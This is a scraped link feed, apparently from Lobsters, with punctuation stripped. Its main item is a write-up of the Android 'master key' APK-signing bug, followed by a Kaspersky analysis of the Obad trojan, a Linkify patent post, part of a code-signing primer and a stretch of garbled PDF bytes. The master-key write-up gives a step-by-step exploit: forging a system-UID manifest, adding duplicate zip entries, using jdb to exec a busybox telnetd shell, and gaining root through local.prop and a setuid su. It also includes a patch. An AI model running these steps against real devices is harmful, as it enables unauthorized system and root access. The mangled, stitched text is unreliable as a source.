vulnerabilitythis presentation case study showcasing technical detail android security bug disclosed google february vulnerability involves discrepancy android application cryptographically verified installed allowing apk code modification without breaking cryptographic signature turn simple step away system access controla lot discussion occurred regarding bug detail available past abstract couple cryptic post twitter bluebox security company whose founder giving talk month later information published jeff forristal discoverer bugin blog post uncovering android master key make device vulnerable rather bleak picture painted threat posed discovery week followed story generated lot press covered everything techcrunch la timesplay store safetyon android application signed developer using private cryptographic key comparing certificate used verify signature android package manager determines whether application allowed share information permission able obtaineven system software signed manufacturer device application signed key thereby able anything system software normally possible manufacturer however using bug anyone could steal signature owna key concern raise application wild might signed system key device think installing harmless game application would look package manager came manufacturer giving elevated dangerous system permissionsthankfully cio article vulnerability allows attacker modify android apps without breaking signature learn forristal google made aware bug bluebox security find package exploiting bug android application market play storeusing google play distribute apps modified exploit flaw possible google updated app store application entry process order block apps contain problem forristal said information received bluebox google also suggests existing apps app store problem saidanother potential exploit vector package permission install package interestingly noted honline article android code signing bypassed google blocked nonplaystore updating april year policy workaround security issue compelling thoughtresponsible disclosureof course many reader keenly aware nonmalicious reason interested vulnerability many user device locked manufacturer carrier number dubious reason free device exploit often used empower userthe result many time bug like hoarded used group without warning notice might affected purpose accessing locked device course dangerous game play one u feel must attemptwith bug bluebox security made point felt responsible disclosure important notifying google bug well black hat bug disclosed public jeff forristal reportedly even responsible first publicized responsible security disclosure policy however abstract posted explained signature vulnerability u security community able find bug based information alone knowing look knowing something find make process discovery much much easierfinding bugin case previously looked handling zip file commenting bug someone found ice cream sandwich native code support suck comment described hashtable used read archive looked code used verify archive bug quite clearonce found bug posed moral quandary release tool help people use patch vulnerability wait disclosed public black hat consultation security researcher irc purchased ticket black hat tentatively deciding waitin end however bluebox security made point drumming press issue led speculation eyeball frankly assume truly scary adversary bug within hour black hat schedule posted nighunto public knowledgeto demonstrate easily could found someone commenting hacker news managed figure using idle speculation based reading description jar signing algorithm ctz comment describes two possibility first one bug found bluebox securitythe zip format nt structurally guarantee uniqueness name file entry apk signature verification chooses first matching file entry given name unpacking chooses last screwed way describedsoon thereafter issue filed cyanogenmod opensource alternative distribution android patch android bug security bug coming right heel patch bug posted revision control system remove support duplicate file entry bug publicapk verificationto extent nt really need describe bug anymore done others one highlydetailed blog even posted entire series article seven far documenting bug called great android security hole however way exploit issue different need redocument bugthe core issue android package apk file parsed verified different implementation unzip file code eventually load content package file verified java using harmony zipfile implementation libcore data loaded c reimplementationthe way two implementation handle multiple file name occurring zip file differs way java implementation read file go central directory add entry linkedhashmap key entry stored using name fileprivate final linkedhashmap string zipentry mentries new linkedhashmap string zipentry int numentries itreadshort int numentries zipentry newentry new zipentry hdrbuf bin mentriesput newentrygetname newentry later packageparser go entry zip file verifying file signed consistent signature code iterates linkedhashmap result last entry given name considered signature verification previous duplicate discardedjarfile jarfile new jarfile marchivesourcepath enumeration jarentry entry jarfileentries final manifest manifest jarfilegetmanifest entrieshasmoreelements final jarentry je entriesnextelement final certificate localcerts loadcertificates jarfile je readbuffer localcerts null sloge tag package pkgpackagename certificate entry jegetname ignoring replacing dalvik bytecodeso far exploit described use bug follow directly phrase apk code modification original abstract posted black hat usa goal replace bytecode stored apk loaded vm jarfile implementation us c implementation unzipint numentries parchive mnumentries parchive mhashtablesize numentries parchive mhashtable calloc parchive mhashtablesize sizeof ziphashentry int numentries hash computehash ptr kcdelen filenamelen addtohash parchive ptr kcdelen filenamelen hash ptr kcdelen filenamelen extralen commentlen static void addtohash ziparchive parchive const char str int strlen unsigned int hash const int hashtablesize parchive mhashtablesize int ent hash hashtablesize parchive mhashtable ent name null ent ent parchive mhashtable ent name str parchive mhashtable ent namelen strlen algorithm unchained hashtable linear probing without replacement result every entry original zip file placed array algorithm finding entry adding scan forward looking match mean earlier entry used instead later onesif thereby take existing apk file add new entry zip file classesdex come one already apk continue verify correctly second instance entry used verifier modified file loaded vm come first optimized dex filesthis description easier said done apk file really want target one came manufacturer already device spaceconservation startupperformance reason however file actually contain bytecode enclosed classesdex externally optimizedin case google nexus device lying around none system package contain bytecode replaced developer named pau oliva put together proofofconcept bug mentioned issue androidsecuritydiscuss mailing list thread info android bug yes practice easy system apps odex system apks contain classesdex inside backdoor apk change resourcexml alter actual program odex file outside apkwhat seems developer thereby look apk upgrade published manufacturer must contain new version code deployed apk file modified however finding gem hitandmiss well easily automatedreplacing native librariesanother possibility replacing native code contained package file extracted package manager package installed system startup c code used purpose similar c code dalvik modified quite heavilyint numentries mnumentries mhashtablesize numentries mhashtable calloc mhashtablesize sizeof hashentry int numentries hash computehash ptr kcdelen filenamelen addtohash ptr kcdelen filenamelen hash ptr kcdelen filenamelen extralen commentlen void zipfilero addtohash const char str int strlen unsigned int hash int ent hash mhashtable ent name null ent ent mhashtable ent name str mhashtable ent namelen strlen see hashtable used implementation dalvik entry read zip file stored without replacement however unlike dalvik code us zip file use hashtable look single file classesdex name iterates tableconst int n zipfilegetnumentries int n const zipentryro entry zipfilefindentrybyindex strncmp filename apklib apkliblen continue callfunc env callarg zipfile entry code function iterateovernativefiles nativelibraryhelper go every entry zip file file function pointer called something entry seeing compatible library extracted function copyfileifchanged case looking zipfilerocpp see findentrybyindex start top hashtable looking used slot yes algorithm reasonable way iterate content zip file p bug filed algorithm java code maybe fixed zipentryro zipfilero findentrybyindex int idx const idx idx mnumentries return null int ent ent mhashtablesize ent mhashtable ent name null idx return zipentryro ent kzipentryadj return null sadly code extract library overwrites library previously extracted later entry hashtable win earlier one possible get hashtable wrap moving later entry top array difficult control unlikely due overprovisioningreplacing androidmanifestxmlthe category file contained android application package asset resource technically stored asset managed assetmanager us hashtablebased c unzip implementation used native library extraction logicin particular every package contains file androidmanifestxml describes content package note one proofofconcept implementation bug issue filed github research exactly modified noting androidmanifest messed weird thing start happening file difficult property used packageparser java well assetmanager c thereby need look usage verify nothing cause u problem sound interesting trying complete sorry private static final string androidmanifestfilename androidmanifestxml flag parseissystem jarentry jarentry jarfilegetjarentry androidmanifestfilename cert loadcertificates jarfile jarentry else enumeration jarentry entry jarfileentries entrieshasmoreelements final jarentry je entriesnextelement final string name jegetname androidmanifestfilenameequals name final attribute attribute manifestgetattributes name pkgmanifestdigest manifestdigestfromattributes attribute code packageparser code verifies signature come across androidmanifest save digest later usage field usage described documentation comment also pull code verify used way cause problem digest suitable comparing whether package manifest another public manifestdigest manifestdigest androidmanifestxml entry seen packageparser always one system apk file starting likely installed system already mean manifestdigest field set value system package already installed devicethe place able figure used part package installation process verify package file maliciously changed underneath installation process handoff pm frontend tool backend packagemanager serviceif argsmanifestdigestequals pkgmanifestdigest resreturncode packagemanagerinstallfailedpackagechanged return package changed time installation process fails error installfailedpackagechanged problem u tool parse place manifest verification purpose going need manifestdigest object also obtain javaforwardlocked public filesanother usage java zip code access androidmanifestxml come packagehelper function called extractpublicfiles routine called packagemanagerservice package forwardlocked term applied android attempt providing copyprotected package copy manifest resourcesarsc re directory public zip final zipentry zipentry collectionslist privatezipentries final string zipentryname zipentrygetname androidmanifestxml equal zipentryname resourcesarsc equal zipentryname zipentrynamestartswith re size zipentrygetsize publiczipfile null copyzipentry zipentry privatezip publiczipoutstream isfwdlocked final file destresourcefile new file getresourcepath packagehelperextractpublicfiles codefilename destresourcefile tracing backwards package becomes isfwdlocked largely came whether l flag passed pm frontend package installed also followed another path involved package marked special forwardlocked flag part settingswhile opt nextoption null optequals l installflags packagemanagerinstallforwardlock isforwardlocked pkg currflags packagemanagerinstallforwardlock newflags packagemanagerinstallforwardlock private static boolean isforwardlocked packageparserpackage pkg return pkgapplicationinfoflags applicationinfoflagforwardlock private boolean isforwardlocked packagesetting p return pspkgflags applicationinfoflagforwardlock set global forward lock flag flag parseforwardlock pkgapplicationinfoflags applicationinfoflagforwardlock honestly attempting figure set parseforwardlock came case installforwardlock previously set old version package failing install causing rollback previous copy sort came full circlesuffice say however long one attempt create forwardlocked application using bug problem way obtain forwardlocked application failed find consider reader simply avoid mechanismsinvestigating assetmanagerthe remaining usage manifest assetmanager assmgr asset system keep track file using cooky really offset array file file added asset path get back cookie pas cookie name asset want later lookupassetmanager assmgr null assmgr new assetmanager int cookie assmgraddassetpath marchivesourcepath assmgropenxmlresourceparser cookie androidmanifestfilename inside assetmanagerjava follow attempt open xml asset openxmlresourceparser openxmlblockasset finally openxmlassetnative part native assetmanagercpp us opennonassetinpathlocked find entry zip file return stream contentsxmlblock block openxmlblockasset cookie filename xmlresourceparser rp blocknewparser blockclose return rp int xmlblock openxmlassetnative cookie filename xmlblock xmlblock re new xmlblock xmlblock increfslocked reshashcode return re assetmanager assetmanagerforjavaobject env clazz asset opennonasset cookie asset accessbuffer const sizet cookie asset passet opennonassetinpathlocked filename mode massetpathsitemat aptype kfiletypedirectory else zip file path filename zipfilero pzip zipentryro entry pzip getzipfilelocked ap entry pzip findentrybyname pathstring see modifying androidmanifestxml associated package simple cause serious side effect final step asset pipeline involves using zip file implementation saw previously native library time using findentrybyname vulnerablecompiling androidmanifestwhen replacing androidmanifest apk add plaintext xml file xml resource android compiled resource many attribute replaced numeric identifier shared underlying platform must compile androidmanifest using aapt echo androidmanifestxml eof xml version encoding manifest xmlns android http schemasandroidcomapkresandroid package abcd android versioncode android versionname android shareduserid androiduidsystem application android hascode false manifest eof aapt p f f abcdapk androidmanifestxml androiduidsystem constant used android shareduserid indicates package process data owned system user order use attribute package must signed system developer bypassing requirement course whole point exercise p specify android hascode false part application element modified apk classesdex file otherwise try install package androidmanifest contains application element need define thing like activity get error dex optimizer adb install r abcdapk kb byte pkg datalocaltmpabcdapk failure installfaileddexopt ipackagemanager running dexopt abcd ipackagemanager package abcd codepath changed retaining data using new wdalvikvm dexoptz zip archive include classesdex winstalld dexinv end process failed einstalld dexopt failed datadalvikcachedata app classesdex re wpackagemanager package could nt installed hacking apkour next step build zip file multiple copy androidmanifestxml couple proofofconcepts available implemented python quick dirty poc android bug java apk generator huge hole android reader might choose work one toolsfrankly however project overthinking problem automated tool one definitely something correct parse zip directory entry messing around console totally possible temporarily rename entry zip using sedso take android package compiled previous section rename androidmanifestxml exploitmanifestxml use offtheshelf commandline implementation zip merge file copy settingsapk pulled device finally rename manifest back adb pull systemappsettingsapk kb byte unzip qd setting settingsapk sed e sandroidmanifestexploitmanifestg abcdapk cd setting zip qr abcdapk sed e sexploitmanifestandroidmanifestg abcdapk modified package able installed system verify using file added zip file androidmanifestxml parsed use one compiled using aapt verify package installs way success checking pm list package adb install r abcdapk kb byte pkg datalocaltmpabcdapk success adb shell pm list package grep f abcd package abcd android debuggable runaswe find way run code package using modified manifest one idea multiple reviewer mark package android debuggable true use runas tool setuid program entire system let debug shell run code context debuggable apphowever work implementation runas specifically refuse work target application normal unprivileged application check comparison user id used package purpose system exploit care system user helpfulpkgname argv getpackageinfo pkgname info return reject system package infouid aidapp panic package applicationn pkgname return define aidroot traditional unix root user define aidsystem system server define aidapp first app user android debuggable jdbhowever another option mark process debuggable attach debugger debugger interface allows u run code process order check value variable runtime test logic using different argument use run whatever need target processto first get application running inside process might seem awkward nt code package however specify class want subclass activity entrypoint including activity class system framework xml version encoding manifest xmlns android http schemasandroidcomapkresandroid package abcd android versioncode android versionname android shareduserid androiduidsystem application android hascode false android debuggable true activity android name androidappactivity intentfilter action android name androidintentactionmain category android name androidintentcategorylauncher intentfilter activity application manifest building package manifest start generic activity come screen blank nt anything result process started query debuggable process using adb jdwp find process connect using jdb via adb forward adb shell start androidintentactionmain n abcdandroidappactivity starting intent actandroidintentactionmain cmpabcdandroidappactivity adb jdwp adb forward jdb attach set uncaught javalangthrowable set deferred uncaught javalangthrowable initializing jdb attached jdb get list thread attach specific thread let say main thread attempt use javalangruntimegetruntime expose exec method used run arbitrary external process however nt work get incompatiblethreadstateexception thread group system javalangthread finalizerwatchdogdaemon cond waiting javalangthread finalizerdaemon cond waiting javalangthread referencequeuedaemon cond waiting javalangthread compiler cond waiting javalangthread signal catcher cond waiting javalangthread gc cond waiting group main javalangthread main running javalangthread running javalangthread running javalangthread running thread main print javalangruntimegetruntime comsunjdiincompatiblethreadstateexception comsuntoolsjdithreadreferenceimplframecount comsuntoolsexampledebugttythreadinfogetcurrentframe comsuntoolsexampledebugttycommandsevaluate comsuntoolsexampledebugttycommandsdoprint comsuntoolsexampledebugttycommands comsuntoolsexampledebugttycommands asyncexecution javalangruntimegetruntime null current thread nt suspended error message current thread nt suspended seems somewhat useful ca nt run thing thread already running thing must first suspend thread however nt help still get exception although thrown different location jdb code main suspend thread suspended main print javalangruntimegetruntime comsunjdiincompatiblethreadstateexception comsuntoolsjdiclasstypeimplinvokemethod comsuntoolsexampledebugexprlvalue lvaluestaticmembergetvalue comsuntoolsexampledebugexprexpressionparserevaluate comsuntoolsexampledebugttycommandsevaluate comsuntoolsexampledebugttycommandsdoprint comsuntoolsexampledebugttycommands comsuntoolsexampledebugttycommands asyncexecution javalangruntimegetruntime null reason happening thread ready looking dalvik debugger code dvmdbginvokemethod see useful comment explaining thread ready mean stopped event breakpoint something sort easily accomplishif targetthread invokereqready dvmunlockthreadlist return errinvalidthread thread stopped event looking stacktrace main thread see sitting inside messagequeue nativepollonce backend next called loop looper mean set breakpoint next cause message sent breakpoint hit main androidosmessagequeuenativepollonce native method androidosmessagequeuenext androidoslooperloop androidappactivitythreadmain javalangreflectmethodinvokenative native method javalangreflectmethodinvoke comandroidinternaloszygoteinit methodandargscallerrun comandroidinternaloszygoteinitmain dalviksystemnativestartmain native method main stop androidosmessagequeuenext set breakpoint androidosmessagequeuenext virtually anything activity touching cause message fired also force behavior respawning activity commandline activitycleartask argument one simple way although recent version android adb shell start activitycleartask androidintentactionmain n abcdandroidappactivity starting intent actandroidintentactionmain cmpabcdandroidappactivity breakpoint hit run whatever command want using javalangruntime exec noted pas single string function tokenized using naive algorithm involving splitting space character making difficult run subshells redirects using sh c breakpoint hit thread main androidosmessagequeuenext main print javalangruntimegetruntime exec datalocaltmpbusybox telnetd p l sh javalangruntimegetruntime exec datalocaltmpbusybox telnetd p l sh process however running copy telnetd often compiled busybox nt busybox keep copy compiled arm one server use telnet computer device via busybox connect get shell running system user sadly yet root shell android datalocaltmpbusybox telnet entering character mode escape character system android id system system sdcardrw sdcardr netbtadmin netbt inet netbwacct automated exploitat point exploit possible perform manually clear would beneficial fullyautomated implementation many implementation android exploit involve archive random binary shell script attempting automate adb wanted something solid result first version call cydia impactor tool performing device maintenance task built graphical application run either mac o x window builtin support automatic update check downloaded without entering funny captchas pin order fully automate exploit impactor scan apk file device find one used system application heuristic check common apk name includes custom implementation java debug wire protocol automating debuggeronce downloaded installed current version impactor allows specify command run system user click start use exploit run command right automate getting way root system root burnhowever intend add feature tool future simple thing like logcat viewer automated installation cydia substrate complex task like deviceindependent way get su installed setuid root using nothing fastboot oem unlock even without kernel source available user download impactor using following link mac o x window url always point recent version impactor redirect url specific version updated automatically feel free post forum post twitterobtaining rootthe next goal get root device using android earlier version android use technique described recent article exploiting bug google glass using datalocalprop set running emulator property causing adb run root file longer used recent version android partly use case seems exploit p vendor including sony also disable file even older version android nt want people using escalate system user root using impactor directly run command set content file otherwise either need spend time fighting jdb pas array string exec upload shell script execute indirectly run command via telnetd systemsystem android echo datalocalprop point reboot device come back may error displayed due incompatibility emulator however use adb running root need push copy su get one server set setuid undo hack reboot adb reboot adb shell mount remount rw system adb push su systemxbin adb shell chmod systemxbinsu adb shell rm datalocalprop adb reboot device reboots longer get error adb shell also restricted device longer modified property file however installed su marked right privilege able get root access whenever need via adb install complex su utility funchecking vulnerabilityat point user may wondering whether vulnerable stand device may using one recently supported device alternatively may using thirdparty rom cyanogenmod prioritized getting fix assuming update often irritatingly bluebox put tool check whether device subject vulnerability article scan device android master key vulnerability many report often say vulnerable nt said false negative real problem false positivesanother option srt appscanner available play store however also work correctly possible rekey capable detecting opposed fixing clear finally found program described tool detect bluebox exploit check apks sadly option somewhat slim one potential reason according website xray android vulnerability scanner detect vulnerability application scan vulnerability android device actually play store term service making kind product niche targetwe definitely understand user prefer install apps play store especially securityrelated apps unfortunately google informed u term service play store disallow application xray check android vulnerabilitiesmy primary recommendation trouble getting one application say safe nt trust attempt use exploit tell cydia impactor something meaningless like simply echo see get errorpatching bugin earlier mentioned article cio focus given rather slow android patch cycle bug platform often end going unpatched long period time especially specific device due large number manufacturer configuration device may never get patchedjudging android patch distribution history far vulnerability found bluebox researcher probably linger many device long time especially since likely affect lot model reached endoflife longer supportedit thereby valuable provide fix older device consider good practice releasing exploit also taken time develop fix bug using substrate cydia code modification platform previous io vulnerability one comex used jailbreakme case bug people already done one option xposed module one published tungstwenty recent thread xda developer forum however addition using xposed see v substrate rather blunt replacethewholething patch said tungstwenty module right apparently nt correctly started section p also protects bug providing fix today would delayed article nt test case device new enough use xposed issue using otherwise offer protection extensionhowever solid offering also available form rekey package duo security collin mulliner one excolleagues ucsb rekey us technology closer design substrate daemonbased injection vector also support bug correctly substrate extensionto fix exploit useful look patch cyanogenmod nothing else understanding patch used google fair implement way even result seems somewhat limiting simply refuse duplicate entry zipfilestring entryname newentrygetname mentriesput entryname newentry null throw new zipexception duplicate entry name entryname implement something similar first start basic substrate extension whose initialize function hook classload java zipfile class information using mshookclassload refer substrate api documentation website article public class hook public static void initialize mshookclassload javautilzipzipfile new msclassloadhook public void classloaded class zipfile class loaded need find mentries field field store linkedhashmap going modifying field use setaccessible substrate provides simpler way make change like require outofscope explanation information read article final field zipfile mentries zipfile getdeclaredfield mentries zipfile mentriessetaccessible true final method zipfile readcentraldir zipfile getdeclaredmethod readcentraldir finally use substrate hookmethod functionality change behavior zipfile readcentraldir rather reimplement readcentraldir may lose security patch applied target root cause linkedhashmap support duplicate entry subclass change mshookmethod zipfile zipfile readcentraldir new msmethodalteration zipfile void public void invoked zipfile thiz object args throw throwable zipfile mentriesset thiz new linkedhashmap string zipentry public zipentry put string key zipentry value superput key value null throw new illegalargumentexception duplicate entry name key return null return invoke thiz args complete source code extension clone git repository git gitsaurikcombackportgit view repository online using gitweb instance use direct link hookjava user want install apk get cydia gallery inside substrate final takeawayone may wonder cause kind bug happen highlevel signature verification bug occur something signed verified nt exactly used allowing attacker sign correctly thing verified use something elsein case issue stem multiple implementation unzip file one used java verification code one used dalvik load classesdex third one used load file native library xml asset two separate iteration style something cryptographically signed generally strive one implementation three half well told cursory audit android codebase looking implementation unzip found eight separate copy logicthis insane couple nearly many common lineage two byteforbyte identical bug found one implementation behavior changed regard duplicate want behavior used everywhere make hard
569,Lobsters,android,Android,Your Cellphone is Covered in Spiders; Pragmatic Android Security,http://vimeo.com/46044290,cellphone covered spider pragmatic android security,githubcomcooperqspiders,presentation gave hope number nyc july discus security privacy concern android smartphone platform present step even non technical user take help secure smartphone mostly focus android talk iphone talk well slide additional note free open source found remixed githubcomcooperqspiders
571,Lobsters,android,Android,"Creating iOS and Android Apps in Lisp, with mocl",http://wukix.com/dist/mocl_eclm2013.pdf,creating io android apps lisp mocl,,obj length r filter flatedecode stream x r endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf imageb imagec imagei xobject r endobj obj length r type xobject subtype image width height interpolate true colorspace devicergb smask r bitspercomponent filter flatedecode stream b b b b b b b b b b b b b l v rb urq eϑg g mڂ e g ޚs j ked k sk p bt v p ᖱ l dטy v n ȇpt ku ے н φ
572,Lobsters,android,Android,The most sophisticated Android Trojan,https://www.securelist.com/en/blog/8106/The_most_sophisticated_Android_Trojan,sophisticated android trojan,trojan quirk code analysis obtaining privilege communication owner c c instruction,recently android application came u analysis glance knew one special string dex file encrypted code obfuscated file turned multifunctional trojan capable following sending sm premiumrate number downloading malware program installing infected device andor sending via bluetooth remotely performing command console kaspersky lab product detect malicious program backdoorandroidosobada malware writer typically try make code creation complicated possible make life difficult antimalware expert however rare see concealment advanced odadas mobile malware moreover complete code obfuscation odd thing new trojan trojan quirk creator backdoorandroidosobada found error popular software program typically used analyst convert apk file convenient java archive jar format vulnerability spotted cybercriminals disrupts conversion dalvik bytecode java bytecode eventually complicates statistical analysis trojan also cybercriminals found error android operating system relates processing androidmanifestxml file file exists every android application used describe application structure define launch parameter etc malware modifies androidmanifestxml way comply google standard still correctly processed smartphone thanks exploitation identified vulnerability made extremely difficult run dynamic analysis trojan creator backdoorandroidosobada also used yet another previously unknown error android operating system exploiting vulnerability malicious application enjoy extended device administrator privilege without appearing list application privilege result impossible delete malicious program smartphone gain extended privilege finally backdoorandroidosobada interface work background mode code analysis malicious application external method called via reflection string encrypted including name class method class local descriptor method obtains string required encryption locally updated byte array string hidden array important string containing c c address undergo additional stage decryption trojan first check internet access available downloads page facebookcom extract certain element page us decryption key thus backdoorandroidosobada decrypt c c address internet access available feature complicates analysis piece malware string additionally encrypted local decryptor receives coded string decodes decoded string first decrypted xor operation key additionally decrypted string unsupportedencodingexception obtain key local decryptor decrypts yet another string used argument way key string name function sendtextmessage protected decryption result hand able reproduce application working algorithm obtaining privilege immediately start application attempt obtain device administrator privilege wrote one feature trojan malicious application deleted gained administrator privilege exploiting previously unknown android vulnerability malicious application enjoys extended privilege listed application device administrator privilege already informed google device administrator vulnerability android extended device administrator privilege trojan block device screen second typically happens device connected free wifi network bluetooth activated connection established trojan copy malicious application device located nearby possible backdoorandroidosobada try prevent user discovering malicious activity also trojan attempt obtain root privilege performing command su id communication owner information whether superuser privilege successfully obtained sent c c server obtaining root privilege put cybercriminals advantageous position executing command console remotely first launch malicious application collect following information sends c c server androfoxcom mac address bluetooth device name operator telephone number imei phone user account balance whether device administrator privilege obtained local time collected information sent server form encrypted json object information sent current c c server every time connection established addition malicious program report current status owner sends current table premium number prefix send text message aos parameter task list task list c c server first c c communication session sends blank table list c c address decrypted described communication session trojan may receive updated table premium number new list c c address response c c server sends another json object might look like decryption nexttime conf keycon okzdaglginy keyurl keydie keycip nexttime next connection c c server conf configuration string configuration string contain instruction connect new c c server table number prefix key destination text message new task parameter besides key traffic encryption keycip may sent conf cybercriminals also use text message control trojan configuration string may also contain key string keycon keyurl keydie trojan look incoming text message perform certain action accordingly incoming text message analyzed presence key key found appropriate action performed keycon immediately establish c c connection keydie delete task database keyurl connect new c c server instruction must followed new c c address way cybercriminal create new c c server send address infected device text message containing key make infected device reconnect new server send text message instruction key found conf trojan sends message number provided c c thus infected device even need internet connection receive instruction send charged text message c c instruction trojan receives instruction c c record database instruction recorded database contains instruction sequence number time must executed ordered c c parameter command list send text message parameter contain number text reply deleted ping receive account balance via ussd act proxy send specified data specified address communicate response connect specified address clicker download file server install send list application installed smartphone server send information installed application specified c c server send user contact data server remote shell executes command console specified cybercriminal send file detected bluetooth device command list obada enables malicious program spread file via bluetooth c c server sends trojan receives local address file downloaded infected device c c command malicious program scan nearby device enabled bluetooth connection attempt send downloaded file despite impressive capability backdoorandroidosobada widespread observation period using kaspersky security network data obada installation attempt made attempt infect mobile device various malware conclude review would like add backdoorandroidosobada look closer window malware android trojan term complexity number unpublished vulnerability exploit mean complexity android malware program growing rapidly alongside number
573,Lobsters,android,Android,The Linkify Problem: The Patent and the Behavior,http://commonsware.com/blog/2012/07/23/linkify-problem-patent-behavior.html,linkify problem patent behavior,linkify problem patent behavior method performing action structure computergenerated data u international trade commission number htc device point detect affected device way mitigate damage,linkify problem patent behavior android developer start see functionality regression various device courtesy software patent dispute apple several android device manufacturer already seeing newer htc device shipped u well within reason manufacturer follow suit coming month albeit way february apple computer inc filed u patent application granted entitled method performing action structure computergenerated data record ianalndipootv lawyer play one tv want detailed examination patent please consult qualified legal counsel blogger said nutshell patent cover among thing computer detecting various associating various action structure displaying popup menu allow user choose one action specific case android apple complaining patent cover behavior powered linkify class used various place set android autotext textview case android detects thing like email address url via regular expression make clickable upon click android craft actionview intent clickedupon item call startactivity upon startactivity call may produce popup menu form chooser multiple possible activity could respond intent normally historically would matter u court system adjudicate presumably happen someday however apple filed claim android device manufacturer u international trade commission itc short itc power ban import product might involve violation itc belief complaintant would import continuing legal process churn along effort blocked import number htc device htc made modification device attempt eliminate infringing behavior itc since allowed htc sell modified android device u apple feel effort insufficient entirely possible import block return someday also emininently possible itc act patent affect device manufacturer manufacturer make modification android try get around import block may feel software patent valid legal construct may may feel particular patent invalid may regardless indisputable point patent applied result select android device changing behavior unfortunately change affect u developer normally android device click link show textview augmented android autotext activity appear based upon clicked browser appear url mapping activity appear address forth none changed however suppose two browser two mapping application click one link normal android device chooser behavior apple asserting violates patent various ussold android device htc one get chooser instead open one possible choice automatically default whatever app type link came device though go area setting app configure various application handle restricted type link phone number email address physical address web url presumably geo url unclear streaming link presumably rtsp url unclear audio download video download surface may seem bad basically return classic microsoft window behavior used go specify application handle file extension however scope behavior change bit problem might think would affect stuff powered linkify direct use linkify class android autotext would mistaken affect everything try perform actionview url type whether come webview invoking startactivity link created htmlfromhtml anything else matter none display chooser one choice user specified default activity action way device hence developer browser email client mapping application medium player like might expecting user choose use apps handling sort url disappointed user choose apps via setting via chooser fact may even realize make sort change particularly new android unaware whole chooser thing since vast majority device portion setting user unlikely run across reference blog post like also impact developer calling startactivity url structure might expected chooser appear needed none device also bear mind response problem manufacturer may make different change attempt get around threat import ban tomorrow point detect affected device way mitigate damage interested jetpack compose jetcdev weekly newsletter latest article sample detail compose development jul
574,Lobsters,android,Android,Android code signing,http://nelenkov.blogspot.com/2013/04/android-code-signing.html,android code signing,new security feature new tag google io master branch somewhat boring java code signing flame jar pkcs cm smime support timestamping tsa android code signing pkcs trust store summary,covered new security feature introduced last jelly bean maintenance release last post know new tag already popped aosp google io around corner interesting bit piece trickling aosp master branch probably time new post plenty place get rumour fix regarding io look like build going somewhat boring explore something different instead code signing particular aspect android remained virtually unchanged since first public release central platform pretty much taken granted neither java code signing android implementation particularly new finer detail particularly wellknown try shed light first post series concentrate signature format used next one look code signing fit android security model java code signing know android application coded mostly java android application package file apks weirdlooking jar pay understand jar signing work first first word code signing general would anyone want sign code usual reason integrity authenticity basically executing thirdparty program want make sure nt tampered integrity actually created entity claim come authenticity feature usually implemented digital signature scheme guarantee entity owning signing key produce valid code signature signature verification process verifies code tampered signature produced expected key one problem code signing nt solve directly whether code signer software publisher trusted usual way trust handled requiring code signer hold digital certificate attach signed code verifier decide whether trust certificate either based trust model eg pki web trust casebycase basis another problem code signing solve event attempt whether signed code safe run seen code signed appears trusted third party necessarily safe eg flame java native code packaging format jar file essentially zip file bundling together code class file classesdex android metadata package mf manifest file metainf directory optionally resource code us main manifest file manifestmf entry file name digest value file archive start manifest file typical apk file show use apks instead actual jar example manifestversion createdby android name resdrawablexhdpiiclauncherpng name resmenumainxml name java code signing implemented jar file level adding another manifest file called signature file sf contains data signed digital signature called signature block file rsa dsa ec signature file similar manifest contains digest whole manifest file well digest individual entry manifestmf signatureversion createdby sun microsystems inc name resdrawablexhdpiiclauncherpng name resmenumainxml name digest signature file easily verified using following openssl command openssl binary manifestmf openssl echo en name openssl binary openssl first one take digest entire manifest file encodes base produce value second one simulates digest single manifest entry calculated actual digital signature binary pkcs generally cm format includes signature value signing certificate signature block file produced using rsa algorithm saved extension rsa generated dsa ec key dsa ec extension respectively multiple signature performed resulting multiple sf rsadsaec file jar file metainf directory cm format rather involved allowing signing encryption well different algorithm parameter extensible via custom signed unsigned attribute thorough discussion beyond scope post used jar signing basically contains digest algorithm signing certificate signature value optionally signed data included signeddata cm structure attached signature jar signature nt include detached signature rsa signature block file look like parsed certificate info trimmed openssl inform der certrsa l con sequence l prim object l con cont l con sequence l prim integer l con set l con sequence l prim object l prim null l con sequence l prim object l con cont l con sequence l con sequence l con cont l prim integer l prim integer l con sequence l prim object l prim null l con sequence l con set l con sequence l prim object countryname l prim printablestring jp l con sequence l prim object l prim null l con sequence l prim object rsaencryption l prim null l prim octet string hex dump extract content jar file use openssl smime cm basis smime command verify signature specifying signature file content signed data print signed data verification result openssl smime verify certrsa inform der content certsf signingcertpem signatureversion createdby sun microsystems inc name resdrawablexhdpiiclauncherpng verification successful official tool jar signing verification jarsigner keytool command jdk since java jarsigner also support timestamping signature tsa could quite useful need ascertain time signing eg signing certificate expired feature widely used using jarsigner command jar file signed specifying keystore file alias key use signing used base name signature block file optionally signature algorithm one thing note since java default algorithm changed need explicitly specify want use verification performed similar fashion keystore file used search trusted certificate specified using apk file instead actual jar jarsigner keystore debugkeystore sigalg testapk androiddebugkey jarsigner keystore debugkeystore verify verbose cert testapk smk mon apr jst resdrawablexxhdpiiclauncherpng cnandroid debug oandroid cu androiddebugkey certificate valid pm pm smk tue apr jst classesdex cnandroid debug oandroid cu androiddebugkey certificate valid pm pm tue apr jst metainfmanifestmf tue apr jst metainfcertsf tue apr jst metainfcertrsa signature verified entry listed manifest k least one certificate found keystore least one certificate found identity scope jar verified last command verifies signature block signing certificate ensuring signature file tampered verifies digest signature file certsf match corresponding section manifest file manifestmf one thing note number entry signature file necessarily match manifest file file added signed jar without invalidating signature long none original file changed verification succeeds finally jarsigner read manifest entry check file digest match actual file content optionally check whether signing certificate present specified key store java new strict option perform additional certificate validation validation error treated warning reflected exit code jarsigner command see print certificate detail entry even though entry slightly better way view signer info using java specify verbose summary verbose grouped alternatively use keytool command keytool list printcert jarfile testapk signer signature owner cnandroid debug oandroid cu issuer cnandroid debug oandroid cu serial number valid sat jun jst mon jun jst certificate fingerprint signature algorithm name version know signature block file name listing archive content example also use openssl combination zip command easily extract signing certificate file unzip q c testapk metainfcertrsaopenssl inform der printcerts certpem android code signing evident example android code signing based java jar signing use regular jdk tool sign verify apks besides android specific tool aosp build directory aptly named signapk performs pretty much task jarsigner signing mode also notable difference start jarsigner requires key stored compatible key store file signapk take separate signing key pkcs format certificate der format file input appear support reading dsa key produce signature mechanism raw private key pkcs somewhat hard come easily generate test key pair selfsigned certificate using makekey found developmenttools existing openssl key use however need convert using openssl command echo keypwd openssl 